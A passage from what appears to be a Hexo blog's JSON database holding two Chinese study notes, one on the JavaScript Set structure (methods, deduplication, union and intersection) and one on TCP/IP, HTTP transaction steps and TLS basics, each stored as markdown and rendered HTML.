56\n```\n\n### set 实例属性和方法\n\n#### 属性\n\n* Set.prototype.constructor：构造函数，默认就是 Set 函数\n* Set.prototype.size：返回实例的总数\n\n#### 方法\n\n##### 操作方法\n\n* add(val)：添加某个值，返回 该实例\n* delete(val):删除某个值，返回布尔值，表示是否成功\n* has(val)：返回布尔值，表示是否拥有\n* clear()：清空所有，返回值 void\n\n##### 遍历方法\n\n> set 结构是具有 itrator 接口的，可以直接 for..of 遍历，相当于下面的 values\n\n* keys：返回键名的遍历器对象\n* values：返回值的遍历器对象\n* entries:返回键值对的遍历器对象\n* forEach:使用回调函数遍历每个成员\n\n> 由于 set 没有键名，只有键值，或者说键名和键值一样，所以 keys===values\n\n### 应用\n\n> 扩展运算符（...）内部使用 for..of，所以也可以应用在 set 结构。同时数组的 map 和 filter 方法也可以应用于 set。\n\n```javascript\nlet arr = [3, 5, 2, 2, 5, 5];\nlet unique = [...new Set(arr)];\n// [3, 5, 2]\nlet set = new Set([1, 2, 3]);\nset = new Set([...set].map(x => x * 2));\n// 返回Set结构：{2, 4, 6}\n\nlet set = new Set([1, 2, 3, 4, 5]);\nset = new Set([...set].filter(x => x % 2 == 0));\n// 返回Set结构：{2, 4}\n```\n\n* set 结构很容易实现交集，并集，差集\n\n```javascript\nlet a = new Set([1, 2, 3]);\nlet b = new Set([4, 3, 2]);\n\n// 并集\nlet union = new Set([...a, ...b]);\n// Set {1, 2, 3, 4}\n\n// 交集\nlet intersect = new Set([...a].filter(x => b.has(x)));\n// set {2, 3}\n\n// 差集\nlet difference = new Set([...a].filter(x => !b.has(x)));\n// Set {1}\n```\n","slug":"study-set","published":1,"updated":"2018-04-22T07:07:35.380Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034s300450iofgzvd1nbp","content":"<h2 id=\"使用-set-数据结构\"><a href=\"#使用-set-数据结构\" class=\"headerlink\" title=\"使用 set 数据结构\"></a>使用 set 数据结构</h2><blockquote>\n<p>set 是一个类似数组的数据结构，但是它没有重复值</p>\n</blockquote>\n<h3 id=\"如何生成-set-数据结构\"><a href=\"#如何生成-set-数据结构\" class=\"headerlink\" title=\"如何生成 set 数据结构\"></a>如何生成 set 数据结构</h3><ul>\n<li>直接 new Set()</li>\n<li>往 new Set()传入具有 iterator 接口的数据结构，比如数组</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 例一</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> set = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">4</span>]);</span><br><span class=\"line\">[...set];</span><br><span class=\"line\"><span class=\"comment\">// [1, 2, 3, 4]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 例二</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> items = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">5</span>, <span class=\"number\">5</span>, <span class=\"number\">5</span>]);</span><br><span class=\"line\">items.size; <span class=\"comment\">// 5</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 例三</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> set = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>(<span class=\"built_in\">document</span>.querySelectorAll(<span class=\"string\">\"div\"</span>));</span><br><span class=\"line\">set.size; <span class=\"comment\">// 56</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 类似于</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> set = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>();</span><br><span class=\"line\"><span class=\"built_in\">document</span>.querySelectorAll(<span class=\"string\">\"div\"</span>).forEach(<span class=\"function\"><span class=\"params\">div</span> =&gt;</span> set.add(div));</span><br><span class=\"line\">set.size; <span class=\"comment\">// 56</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"set-实例属性和方法\"><a href=\"#set-实例属性和方法\" class=\"headerlink\" title=\"set 实例属性和方法\"></a>set 实例属性和方法</h3><h4 id=\"属性\"><a href=\"#属性\" class=\"headerlink\" title=\"属性\"></a>属性</h4><ul>\n<li>Set.prototype.constructor：构造函数，默认就是 Set 函数</li>\n<li>Set.prototype.size：返回实例的总数</li>\n</ul>\n<h4 id=\"方法\"><a href=\"#方法\" class=\"headerlink\" title=\"方法\"></a>方法</h4><h5 id=\"操作方法\"><a href=\"#操作方法\" class=\"headerlink\" title=\"操作方法\"></a>操作方法</h5><ul>\n<li>add(val)：添加某个值，返回 该实例</li>\n<li>delete(val):删除某个值，返回布尔值，表示是否成功</li>\n<li>has(val)：返回布尔值，表示是否拥有</li>\n<li>clear()：清空所有，返回值 void</li>\n</ul>\n<h5 id=\"遍历方法\"><a href=\"#遍历方法\" class=\"headerlink\" title=\"遍历方法\"></a>遍历方法</h5><blockquote>\n<p>set 结构是具有 itrator 接口的，可以直接 for..of 遍历，相当于下面的 values</p>\n</blockquote>\n<ul>\n<li>keys：返回键名的遍历器对象</li>\n<li>values：返回值的遍历器对象</li>\n<li>entries:返回键值对的遍历器对象</li>\n<li>forEach:使用回调函数遍历每个成员</li>\n</ul>\n<blockquote>\n<p>由于 set 没有键名，只有键值，或者说键名和键值一样，所以 keys===values</p>\n</blockquote>\n<h3 id=\"应用\"><a href=\"#应用\" class=\"headerlink\" title=\"应用\"></a>应用</h3><blockquote>\n<p>扩展运算符（…）内部使用 for..of，所以也可以应用在 set 结构。同时数组的 map 和 filter 方法也可以应用于 set。</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [<span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">5</span>, <span class=\"number\">5</span>];</span><br><span class=\"line\"><span class=\"keyword\">let</span> unique = [...new <span class=\"built_in\">Set</span>(arr)];</span><br><span class=\"line\"><span class=\"comment\">// [3, 5, 2]</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> set = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>]);</span><br><span class=\"line\">set = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([...set].map(<span class=\"function\"><span class=\"params\">x</span> =&gt;</span> x * <span class=\"number\">2</span>));</span><br><span class=\"line\"><span class=\"comment\">// 返回Set结构：&#123;2, 4, 6&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> set = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>]);</span><br><span class=\"line\">set = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([...set].filter(<span class=\"function\"><span class=\"params\">x</span> =&gt;</span> x % <span class=\"number\">2</span> == <span class=\"number\">0</span>));</span><br><span class=\"line\"><span class=\"comment\">// 返回Set结构：&#123;2, 4&#125;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>set 结构很容易实现交集，并集，差集</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> a = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>]);</span><br><span class=\"line\"><span class=\"keyword\">let</span> b = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([<span class=\"number\">4</span>, <span class=\"number\">3</span>, <span class=\"number\">2</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 并集</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> union = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([...a, ...b]);</span><br><span class=\"line\"><span class=\"comment\">// Set &#123;1, 2, 3, 4&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 交集</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> intersect = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([...a].filter(<span class=\"function\"><span class=\"params\">x</span> =&gt;</span> b.has(x)));</span><br><span class=\"line\"><span class=\"comment\">// set &#123;2, 3&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 差集</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> difference = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([...a].filter(<span class=\"function\"><span class=\"params\">x</span> =&gt;</span> !b.has(x)));</span><br><span class=\"line\"><span class=\"comment\">// Set &#123;1&#125;</span></span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"使用-set-数据结构\"><a href=\"#使用-set-数据结构\" class=\"headerlink\" title=\"使用 set 数据结构\"></a>使用 set 数据结构</h2><blockquote>\n<p>set 是一个类似数组的数据结构，但是它没有重复值</p>\n</blockquote>\n<h3 id=\"如何生成-set-数据结构\"><a href=\"#如何生成-set-数据结构\" class=\"headerlink\" title=\"如何生成 set 数据结构\"></a>如何生成 set 数据结构</h3><ul>\n<li>直接 new Set()</li>\n<li>往 new Set()传入具有 iterator 接口的数据结构，比如数组</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 例一</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> set = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">4</span>]);</span><br><span class=\"line\">[...set];</span><br><span class=\"line\"><span class=\"comment\">// [1, 2, 3, 4]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 例二</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> items = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">5</span>, <span class=\"number\">5</span>, <span class=\"number\">5</span>]);</span><br><span class=\"line\">items.size; <span class=\"comment\">// 5</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 例三</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> set = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>(<span class=\"built_in\">document</span>.querySelectorAll(<span class=\"string\">\"div\"</span>));</span><br><span class=\"line\">set.size; <span class=\"comment\">// 56</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 类似于</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> set = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>();</span><br><span class=\"line\"><span class=\"built_in\">document</span>.querySelectorAll(<span class=\"string\">\"div\"</span>).forEach(<span class=\"function\"><span class=\"params\">div</span> =&gt;</span> set.add(div));</span><br><span class=\"line\">set.size; <span class=\"comment\">// 56</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"set-实例属性和方法\"><a href=\"#set-实例属性和方法\" class=\"headerlink\" title=\"set 实例属性和方法\"></a>set 实例属性和方法</h3><h4 id=\"属性\"><a href=\"#属性\" class=\"headerlink\" title=\"属性\"></a>属性</h4><ul>\n<li>Set.prototype.constructor：构造函数，默认就是 Set 函数</li>\n<li>Set.prototype.size：返回实例的总数</li>\n</ul>\n<h4 id=\"方法\"><a href=\"#方法\" class=\"headerlink\" title=\"方法\"></a>方法</h4><h5 id=\"操作方法\"><a href=\"#操作方法\" class=\"headerlink\" title=\"操作方法\"></a>操作方法</h5><ul>\n<li>add(val)：添加某个值，返回 该实例</li>\n<li>delete(val):删除某个值，返回布尔值，表示是否成功</li>\n<li>has(val)：返回布尔值，表示是否拥有</li>\n<li>clear()：清空所有，返回值 void</li>\n</ul>\n<h5 id=\"遍历方法\"><a href=\"#遍历方法\" class=\"headerlink\" title=\"遍历方法\"></a>遍历方法</h5><blockquote>\n<p>set 结构是具有 itrator 接口的，可以直接 for..of 遍历，相当于下面的 values</p>\n</blockquote>\n<ul>\n<li>keys：返回键名的遍历器对象</li>\n<li>values：返回值的遍历器对象</li>\n<li>entries:返回键值对的遍历器对象</li>\n<li>forEach:使用回调函数遍历每个成员</li>\n</ul>\n<blockquote>\n<p>由于 set 没有键名，只有键值，或者说键名和键值一样，所以 keys===values</p>\n</blockquote>\n<h3 id=\"应用\"><a href=\"#应用\" class=\"headerlink\" title=\"应用\"></a>应用</h3><blockquote>\n<p>扩展运算符（…）内部使用 for..of，所以也可以应用在 set 结构。同时数组的 map 和 filter 方法也可以应用于 set。</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> arr = [<span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">5</span>, <span class=\"number\">5</span>];</span><br><span class=\"line\"><span class=\"keyword\">let</span> unique = [...new <span class=\"built_in\">Set</span>(arr)];</span><br><span class=\"line\"><span class=\"comment\">// [3, 5, 2]</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> set = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>]);</span><br><span class=\"line\">set = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([...set].map(<span class=\"function\"><span class=\"params\">x</span> =&gt;</span> x * <span class=\"number\">2</span>));</span><br><span class=\"line\"><span class=\"comment\">// 返回Set结构：&#123;2, 4, 6&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> set = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>]);</span><br><span class=\"line\">set = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([...set].filter(<span class=\"function\"><span class=\"params\">x</span> =&gt;</span> x % <span class=\"number\">2</span> == <span class=\"number\">0</span>));</span><br><span class=\"line\"><span class=\"comment\">// 返回Set结构：&#123;2, 4&#125;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>set 结构很容易实现交集，并集，差集</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> a = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>]);</span><br><span class=\"line\"><span class=\"keyword\">let</span> b = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([<span class=\"number\">4</span>, <span class=\"number\">3</span>, <span class=\"number\">2</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 并集</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> union = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([...a, ...b]);</span><br><span class=\"line\"><span class=\"comment\">// Set &#123;1, 2, 3, 4&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 交集</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> intersect = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([...a].filter(<span class=\"function\"><span class=\"params\">x</span> =&gt;</span> b.has(x)));</span><br><span class=\"line\"><span class=\"comment\">// set &#123;2, 3&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 差集</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> difference = <span class=\"keyword\">new</span> <span class=\"built_in\">Set</span>([...a].filter(<span class=\"function\"><span class=\"params\">x</span> =&gt;</span> !b.has(x)));</span><br><span class=\"line\"><span class=\"comment\">// Set &#123;1&#125;</span></span><br></pre></td></tr></table></figure>\n"},{"title":"TCP/IP学习（二）","date":"2018-05-22T02:41:18.000Z","_content":"\n# TCP 和 IP 协议\n\n## IP（Internet Protocol 网际协议）\n\n* 是计算机用来相互识别的通信的一种机制，每台计算机都有一个 ip 来识别在 internet 上的位置\n* ip 协议仅仅是允许计算机相互发消息，但是它并不检查消息是否以发送的次序到达而且没有损坏\n* 为了提供消息校验功能，直接在 IP 协议上设置 TCP\n\n## TCP（Transmission Control Protocol 传输控制协议）\n\n* 保证数据包以正确序列到达，并且尝试确认数据包的内容没有改变\n* tcp 在 ip 地址之上引端口，允许计算机通过网络提供各种服务\n* 用于从应用程序到网络的数据传输控制，而 ip 负责计算机间的通信\n\n# HTTP 工作过程\n\n> 一次 HTTP 操作称作一个事务\n\n* 地址解析\n  * 从地址分解出协议名，主机名，端口\n  * 需要 DNS 解析域名，得到主机的 ip 地址\n* 封装 HTTP 请求数据包\n* 封装成 TCP 包，建立 TCP 连接（三次握手）\n  * 在 http 工作之前，首先要通过网络与服务器建立连接，该连接通过 tcp 完成\n  * http 是比 tcp 更高层次的应用层协议，更具规则，只有低层次协议建立之后，才能进行更高层协议的连接\n* 发送 http 请求\n* 服务器响应\n* 服务器关闭 TCP 连接\n  * 如果加入了长连接（keep-alive），tcp 连接仍然保持打开状态，减少建立新连接所需的时间，还节约了带宽\n\n# HTTPS 的 TLS/SSL\n\n> TLS 全称是 transport layer security（安全传输层协议）\n\n## 主要作用\n\n* 对数据进行加密，并建立一个信息安全通道，来保证传输过程中的数据安全\n* 对网站服务器进行真实身份认证\n\n## 依赖的基本算法\n\n> 主要是三类\n\n* 散列函数验证信息的完整性\n* 对称加密算法采用协商好的秘钥对数据加密\n* 非对称加密实现身份认证和密钥协商\n\n# 推荐阅读\n\n* [HTTP 和 HTTPS 详解](https://juejin.im/post/5af557a3f265da0b9265a498#heading-32)\n","source":"_posts/study-tcpip-02.md","raw":"---\ntitle: TCP/IP学习（二）\ndate: 2018-05-22 10:41:18\ntags: 计算机网络\n---\n\n# TCP 和 IP 协议\n\n## IP（Internet Protocol 网际协议）\n\n* 是计算机用来相互识别的通信的一种机制，每台计算机都有一个 ip 来识别在 internet 上的位置\n* ip 协议仅仅是允许计算机相互发消息，但是它并不检查消息是否以发送的次序到达而且没有损坏\n* 为了提供消息校验功能，直接在 IP 协议上设置 TCP\n\n## TCP（Transmission Control Protocol 传输控制协议）\n\n* 保证数据包以正确序列到达，并且尝试确认数据包的内容没有改变\n* tcp 在 ip 地址之上引端口，允许计算机通过网络提供各种服务\n* 用于从应用程序到网络的数据传输控制，而 ip 负责计算机间的通信\n\n# HTTP 工作过程\n\n> 一次 HTTP 操作称作一个事务\n\n* 地址解析\n  * 从地址分解出协议名，主机名，端口\n  * 需要 DNS 解析域名，得到主机的 ip 地址\n* 封装 HTTP 请求数据包\n* 封装成 TCP 包，建立 TCP 连接（三次握手）\n  * 在 http 工作之前，首先要通过网络与服务器建立连接，该连接通过 tcp 完成\n  * http 是比 tcp 更高层次的应用层协议，更具规则，只有低层次协议建立之后，才能进行更高层协议的连接\n* 发送 http 请求\n* 服务器响应\n* 服务器关闭 TCP 连接\n  * 如果加入了长连接（keep-alive），tcp 连接仍然保持打开状态，减少建立新连接所需的时间，还节约了带宽\n\n# HTTPS 的 TLS/SSL\n\n> TLS 全称是 transport layer security（安全传输层协议）\n\n## 主要作用\n\n* 对数据进行加密，并建立一个信息安全通道，来保证传输过程中的数据安全\n* 对网站服务器进行真实身份认证\n\n## 依赖的基本算法\n\n> 主要是三类\n\n* 散列函数验证信息的完整性\n* 对称加密算法采用协商好的秘钥对数据加密\n* 非对称加密实现身份认证和密钥协商\n\n# 推荐阅读\n\n* [HTTP 和 HTTPS 详解](https://juejin.im/post/5af557a3f265da0b9265a498#heading-32)\n","slug":"study-tcpip-02","published":1,"updated":"2018-05-22T03:19:36.485Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034s400470iofkoedazmy","content":"<h1 id=\"TCP-和-IP-协议\"><a href=\"#TCP-和-IP-协议\" class=\"headerlink\" title=\"TCP 和 IP 协议\"></a>TCP 和 IP 协议</h1><h2 id=\"IP（Internet-Protocol-网际协议）\"><a href=\"#IP（Internet-Protocol-网际协议）\" class=\"headerlink\" title=\"IP（Internet Protocol 网际协议）\"></a>IP（Internet Protocol 网际协议）</h2><ul>\n<li>是计算机用来相互识别的通信的一种机制，每台计算机都有一个 ip 来识别在 internet 上的位置</li>\n<li>ip 协议仅仅是允许计算机相互发消息，但是它并不检查消息是否以发送的次序到达而且没有损坏</li>\n<li>为了提供消息校验功能，直接在 IP 协议上设置 TCP</li>\n</ul>\n<h2 id=\"TCP（Transmission-Control-Protocol-传输控制协议）\"><a href=\"#TCP（Transmission-Control-Protocol-传输控制协议）\" class=\"headerlink\" title=\"TCP（Transmission Control Protocol 传输控制协议）\"></a>TCP（Transmission Control Protocol 传输控制协议）</h2><ul>\n<li>保证数据包以正确序列到达，并且尝试确认数据包的内容没有改变</li>\n<li>tcp 在 ip 地址之上引端口，允许计算机通过网络提供各种服务</li>\n<li>用于从应用程序到网络的数据传输控制，而 ip 负责计算机间的通信</li>\n</ul>\n<h1 id=\"HTTP-工作过程\"><a href=\"#HTTP-工作过程\" class=\"headerlink\" title=\"HTTP 工作过程\"></a>HTTP 工作过程</h1><blockquote>\n<p>一次 HTTP 操作称作一个事务</p>\n</blockquote>\n<ul>\n<li>地址解析<ul>\n<li>从地址分解出协议名，主机名，端口</li>\n<li>需要 DNS 解析域名，得到主机的 ip 地址</li>\n</ul>\n</li>\n<li>封装 HTTP 请求数据包</li>\n<li>封装成 TCP 包，建立 TCP 连接（三次握手）<ul>\n<li>在 http 工作之前，首先要通过网络与服务器建立连接，该连接通过 tcp 完成</li>\n<li>http 是比 tcp 更高层次的应用层协议，更具规则，只有低层次协议建立之后，才能进行更高层协议的连接</li>\n</ul>\n</li>\n<li>发送 http 请求</li>\n<li>服务器响应</li>\n<li>服务器关闭 TCP 连接<ul>\n<li>如果加入了长连接（keep-alive），tcp 连接仍然保持打开状态，减少建立新连接所需的时间，还节约了带宽</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"HTTPS-的-TLS-SSL\"><a href=\"#HTTPS-的-TLS-SSL\" class=\"headerlink\" title=\"HTTPS 的 TLS/SSL\"></a>HTTPS 的 TLS/SSL</h1><blockquote>\n<p>TLS 全称是 transport layer security（安全传输层协议）</p>\n</blockquote>\n<h2 id=\"主要作用\"><a href=\"#主要作用\" class=\"headerlink\" title=\"主要作用\"></a>主要作用</h2><ul>\n<li>对数据进行加密，并建立一个信息安全通道，来保证传输过程中的数据安全</li>\n<li>对网站服务器进行真实身份认证</li>\n</ul>\n<h2 id=\"依赖的基本算法\"><a href=\"#依赖的基本算法\" class=\"headerlink\" title=\"依赖的基本算法\"></a>依赖的基本算法</h2><blockquote>\n<p>主要是三类</p>\n</blockquote>\n<ul>\n<li>散列函数验证信息的完整性</li>\n<li>对称加密算法采用协商好的秘钥对数据加密</li>\n<li>非对称加密实现身份认证和密钥协商</li>\n</ul>\n<h1 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><ul>\n<li><a href=\"https://juejin.im/post/5af557a3f265da0b9265a498#heading-32\" target=\"_blank\" rel=\"noopener\">HTTP 和 HTTPS 详解</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"TCP-和-IP-协议\"><a href=\"#TCP-和-IP-协议\" class=\"headerlink\" title=\"TCP 和 IP 协议\"></a>TCP 和 IP 协议</h1><h2 id=\"IP（Internet-Protocol-网际协议）\"><a href=\"#IP（Internet-Protocol-网际协议）\" class=\"headerlink\" title=\"IP（Internet Protocol 网际协议）\"></a>IP（Internet Protocol 网际协议）</h2><ul>\n<li>是计算机用来相互识别的通信的一种机制，每台计算机都有一个 ip 来识别在 internet 上的位置</li>\n<li>ip 协议仅仅是允许计算机相互发消息，但是它并不检查消息是否以发送的次序到达而且没有损坏</li>\n<li>为了提供消息校验功能，直接在 IP 协议上设置 TCP</li>\n</ul>\n<h2 id=\"TCP（Transmission-Control-Protocol-传输控制协议）\"><a href=\"#TCP（Transmission-Control-Protocol-传输控制协议）\" class=\"headerlink\" title=\"TCP（Transmission Control Protocol 传输控制协议）\"></a>TCP（Transmission Control Protocol 传输控制协议）</h2><ul>\n<li>保证数据包以正确序列到达，并且尝试确认数据包的内容没有改变</li>\n<li>tcp 在 ip 地址之上引端口，允许计算机通过网络提供各种服务</li>\n<li>用于从应用程序到网络的数据传输控制，而 ip 负责计算机间的通信</li>\n</ul>\n<h1 id=\"HTTP-工作过程\"><a href=\"#HTTP-工作过程\" class=\"headerlink\" title=\"HTTP 工作过程\"></a>HTTP 工作过程</h1><blockquote>\n<p>一次 HTTP 操作称作一个事务</p>\n</blockquote>\n<ul>\n<li>地址解析<ul>\n<li>从地址分解出协议名，主机名，端口</li>\n<li>需要 DNS 解析域名，得到主机的 ip 地址</li>\n</ul>\n</li>\n<li>封装 HTTP 请求数据包</li>\n<li>封装成 TCP 包，建立 TCP 连接（三次握手）<ul>\n<li>在 http 工作之前，首先要通过网络与服务器建立连接，该连接通过 tcp 完成</li>\n<li>http 是比 tcp 更高层次的应用层协议，更具规则，只有低层次协议建立之后，才能进行更高层协议的连接</li>\n</ul>\n</li>\n<li>发送 http 请求</li>\n<li>服务器响应</li>\n<li>服务器关闭 TCP 连接<ul>\n<li>如果加入了长连接（keep-alive），tcp 连接仍然保持打开状态，减少建立新连接所需的时间，还节约了带宽</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"HTTPS-的-TLS-SSL\"><a href=\"#HTTPS-的-TLS-SSL\" class=\"headerlink\" title=\"HTTPS 的 TLS/SSL\"></a>HTTPS 的 TLS/SSL</h1><blockquote>\n<p>TLS 全称是 transport layer security（安全传输层协议）</p>\n</blockquote>\n<h2 id=\"主要作用\"><a href=\"#主要作用\" class=\"headerlink\" title=\"主要作用\"></a>主要作用</h2><ul>\n<li>对数据进行加密，并建立一个信息安全通道，来保证传输过程中的数据安全</li>\n<li>对网站服务器进行真实身份认证</li>\n</ul>\n<h2 id=\"依赖的基本算法\"><a href=\"#依赖的基本算法\" class=\"headerlink\" title=\"依赖的基本算法\"></a>依赖的基本算法</h2><blockquote>\n<p>主要是三类</p>\n</blockquote>\n<ul>\n<li>散列函数验证信息的完整性</li>\n<li>对称加密算法采用协商好的秘钥对数据加密</li>\n<li>非对称加密实现身份认证和密钥协商</li>\n</ul>\n<h1 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><ul>\n<li><a href=\"https://juejin.im/post/5af557a3f265da0b9265a498#heading-32\" target=\"_blank\" rel=\"noopener\">HTTP 和 HTTPS 